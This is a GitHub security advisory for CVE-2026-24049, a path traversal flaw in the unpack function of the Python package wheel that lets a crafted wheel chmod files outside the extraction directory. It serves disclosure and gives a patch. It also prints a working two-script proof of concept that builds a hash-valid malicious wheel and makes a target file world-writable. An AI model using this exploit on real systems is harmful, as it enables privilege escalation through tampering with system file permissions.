# [H] Wheel Affected by Arbitrary File Permission Modification via Path Traversal in wheel unpack

## Summary
Severity: High
Advisory: GHSA-8rrh-rw8j-w5fx
CVE: CVE-2026-24049
CWE: CWE-22
Ecosystem: PyPI
CVSS: CVSS:3.1/AV:L/AC:L/PR:N/UI:R/S:U/C:N/I:H/A:H (CVSS_V3)
Published: 2026-01-22
Source: https://github.com/advisories/GHSA-8rrh-rw8j-w5fx
Type: github-advisory

## Affected
- PyPI: `wheel` — affected >=0.40.0 <0.46.2

## Details
### Summary
 - **Vulnerability Type:** Path Traversal (CWE-22) leading to Arbitrary File Permission Modification.  
 - **Root Cause Component:** wheel.cli.unpack.unpack function.  
 - **Affected Packages:**  
   1. wheel (Upstream source)  
   2. setuptools (Downstream, vendors wheel)  
 - **Severity:** High (Allows modifying system file permissions).  

### Details  
The vulnerability exists in how the unpack function handles file permissions after extraction. The code blindly trusts the filename from the archive header for the chmod operation, even though the extraction process itself might have sanitized the path.  
```
# Vulnerable Code Snippet (present in both wheel and setuptools/_vendor/wheel)
for zinfo in wf.filelist:
    wf.extract(zinfo, destination)  # (1) Extraction is handled safely by zipfile

    # (2) VULNERABILITY:
    # The 'permissions' are applied to a path constructed using the UNSANITIZED 'zinfo.filename'.
    # If zinfo.filename contains "../", this targets files outside the destination.
    permissions = zinfo.external_attr >> 16 & 0o777
    destination.joinpath(zinfo.filename).chmod(permissions)
```  

### PoC  
I have confirmed this exploit works against the unpack function imported from setuptools._vendor.wheel.cli.unpack.  

**Prerequisites:** pip install setuptools  

**Step 1: Generate the Malicious Wheel (gen_poc.py)**  
This script creates a wheel that passes internal hash validation but contains a directory traversal payload in the file list.  
```
import zipfile
import hashlib
import base64
import os

def urlsafe_b64encode(data):
    """
    Helper function to encode data using URL-safe Base64 without padding.
    Required by the Wheel file format specification.
    """
    return base64.urlsafe_b64encode(data).rstrip(b'=').decode('ascii')

def get_hash_and_size(data_bytes):
    """
    Calculates SHA-256 hash and size of the data.
    These values are required to construct a valid 'RECORD' file,
    which is used by the 'wheel' library to verify integrity.
    """
    digest = hashlib.sha256(data_bytes).digest()
    hash_str = "sha256=" + urlsafe_b64encode(digest)
    return hash_str, str(len(data_bytes))

def create_evil_wheel_v4(filename="evil-1.0-py3-none-any.whl"):
    print(f"[Generator V4] Creating 'Authenticated' Malicious Wheel: {filename}")

    # 1. Prepare Standard Metadata Content
    # These are minimal required contents to make the wheel look legitimate.
    wheel_content = b"Wheel-Version: 1.0\nGenerator: bdist_wheel (0.37.1)\nRoot-Is-Purelib: true\nTag: py3-none-any\n"
    metadata_content = b"Metadata-Version: 2.1\nName: evil\nVersion: 1.0\nSummary: PoC Package\n"
   
    # 2. Define Malicious Payload (Path Traversal)
    # The content doesn't matter, but the path does.
    payload_content = b"PWNED by Path Traversal"

    # [ATTACK VECTOR]: Target a file OUTSIDE the extraction directory using '../'
    # The vulnerability allows 'chmod' to affect this path directly.
    malicious_path = "../../poc_target.txt"

    # 3. Calculate Hashes for Integrity Check Bypass
    # The 'wheel' library verifies if the file hash matches the RECORD entry.
    # To bypass this check, we calculate the correct hash for our malicious file.
    wheel_hash, wheel_size = get_hash_and_size(wheel_content)
    metadata_hash, metadata_size = get_hash_and_size(metadata_content)
    payload_hash, payload_size = get_hash_and_size(payload_content)

    # 4. Construct the 'RECORD' File
    # The RECORD file lists all files in the wheel with their hashes.
    # CRITICAL: We explicitly register the malicious path ('../../poc_target.txt') here.
    # This tricks the 'wheel' library into treating the malicious file as a valid, verified component.
    record_lines = [
        f"evil-1.0.dist-info/WHEEL,{wheel_hash},{wheel_size}",
        f"evil-1.0.dist-info/METADATA,{metadata_hash},{metadata_size}",
        f"{malicious_path},{payload_hash},{payload_size}",  # <-- Authenticating the malicious path
        "evil-1.0.dist-info/RECORD,,"
    ]
    record_content = "\n".join(record_lines).encode('utf-8')

    # 5. Build the Zip File
    with zipfile.ZipFile(filename, "w") as zf:
        # Write standard metadata files
        zf.writestr("evil-1.0.dist-info/WHEEL", wheel_content)
        zf.writestr("evil-1.0.dist-info/METADATA", metadata_content)
        zf.writestr("evil-1.0.dist-info/RECORD", record_content)

        # [EXPLOIT CORE]: Manually craft ZipInfo for the malicious file
        # We need to set specific permission bits to trigger the vulnerability.
        zinfo = zipfile.ZipInfo(malicious_path)
       
        # Set external attributes to 0o777 (rwxrwxrwx)
        # Upper 16 bits: File type (0o100000 = Regular File)
        # Lower 16 bits: Permissions (0o777 = World Writable)
        # The vulnerable 'unpack' function will blindly apply this '777' to the system file.
        zinfo.external_attr = (0o100000 | 0o777) << 16
       
        zf.writestr(zinfo, payload_content)

    print("[Generator V4] Done. Malicious file added to RECORD and validation checks should pass.")

if __name__ == "__main__":
    create_evil_wheel_v4()
```  

**Step 2: Run the Exploit (exploit.py)**  
```
from pathlib import Path
import sys

# Demonstrating impact on setuptools
try:
    from setuptools._vendor.wheel.cli.unpack import unpack
    print("[*] Loaded unpack from setuptools")
except ImportError:
    from wheel.cli.unpack import unpack
    print("[*] Loaded unpack from wheel")

# 1. Setup Target (Read-Only system file simulation)
target = Path("poc_target.txt")
target.write_text("SENSITIVE CONFIG")
target.chmod(0o400) # Read-only
print(f"[*] Initial Perms: {oct(target.stat().st_mode)[-3:]}")

# 2. Run Vulnerable Unpack
# The wheel contains "../../poc_target.txt".
# unpack() will extract safely, BUT chmod() will hit the actual target file.
try:
    unpack("evil-1.0-py3-none-any.whl", "unpack_dest")
except Exception as e:
    print(f"[!] Ignored expected extraction error: {e}")

# 3. Check Result
final_perms = oct(target.stat().st_mode)[-3:]
print(f"[*] Final Perms: {final_perms}")

if final_perms == "777":
    print("VULNERABILITY CONFIRMED: Target file is now world-writable (777)!")
else:
    print("[-] Attack failed.")
```  

**result:**  
<img width="806" height="838" alt="image" src="https://github.com/user-attachments/assets/f750eb3b-36ea-445c-b7f4-15c14eb188db" />  
  
### Impact  
Attackers can craft a malicious wheel file that, when unpacked, changes the permissions of critical system files (e.g., /etc/passwd, SSH keys, config files) to 777. This allows for Privilege Escalation or arbitrary code execution by modifying now-writable scripts.  

### Recommended Fix  
The unpack function must not use zinfo.filename for post-extraction operations. It should use the sanitized path returned by wf.extract().  

### Suggested Patch:  
```
# extract() returns the actual path where the file was written
extracted_path = wf.extract(zinfo, destination)

# Only apply chmod if a file was actually written
if extracted_path:
    permissions = zinfo.external_attr >> 16 & 0o777
    Path(extracted_path).chmod(permissions)
```

## References
- https://github.com/pypa/wheel/security/advisories/GHSA-8rrh-rw8j-w5fx
- https://nvd.nist.gov/vuln/detail/CVE-2026-24049
- https://github.com/pypa/wheel/commit/7a7d2de96b22a9adf9208afcc9547e1001569fef
- https://github.com/pypa/wheel/commit/934fe177ff912c8e03d5ae951d3805e1fd90ba5e
- https://github.com/pypa/wheel
- https://github.com/pypa/wheel/releases/tag/0.46.2
